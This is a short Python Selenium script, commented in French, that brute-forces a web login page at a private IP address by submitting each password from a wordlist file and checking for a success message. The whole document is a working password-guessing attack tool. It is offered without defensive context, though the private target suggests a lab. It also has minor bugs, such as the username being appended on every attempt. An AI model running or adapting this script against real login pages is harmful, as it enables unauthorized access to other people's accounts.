from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import getpass 
import time

# URL du site web cible
url = 'http://10.211.55.3'

# Charger les mots de passe à partir du fichier wordlist.txt
with open('wordlist.txt', 'r') as file:
    mots_de_passe = [line.strip() for line in file.readlines()]

# Instancier le navigateur web
driver = webdriver.Chrome()

try:
    # Accéder à la page de connexion
    driver.get(url)

    # Attendre un certain temps pour que la page se charge complètement
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, 'input[placeholder="Login"]')))

    # Remplir le champ du nom d'utilisateur
    login_field = driver.find_element(By.CSS_SELECTOR, 'input[id="login"]')
    # login_field.send_keys('selestat')

    # Trouver le champ du mot de passe après le chargement de la page
    password_field = driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Mot de passe"]')

    # Essayer chaque mot de passe de la liste
    for mot_de_passe in mots_de_passe:
        # Afficher le mot de passe en clair
        print(f"Trying password: {mot_de_passe}")

        # Remplir le champ du mot de passe
        password_field.clear()  # Effacer le contenu du champ
        login_field.send_keys('username')
        password_field.send_keys(mot_de_passe)

        # Soumettre le formulaire
        password_field.send_keys(Keys.RETURN)

        # Attendre un certain temps pour voir la réponse du site
        driver.implicitly_wait(3)

        # Réinitialiser les références des champs après le rechargement de la page
        login_field = driver.find_element(By.CSS_SELECTOR, 'input[id="login"]')
        password_field = driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Mot de passe"]')

        # Vous pouvez ajouter ici une vérification pour déterminer si la tentative a réussi
        # Par exemple, vérifier si un élément spécifique est présent sur la page après la tentative
        if "Message de succès" in driver.page_source:
            print(f"Mot de passe correct : {mot_de_passe}")
            break  # Sortir de la boucle si le mot de passe est correct

finally:
    # Ajouter une pause pour que le navigateur reste ouvert pendant un certain temps
    time.sleep(10)

    # Imprimer le code source de la page
    print(driver.page_source)

    # Fermer le navigateur à la fin, même en cas d'erreur
    driver.quit()
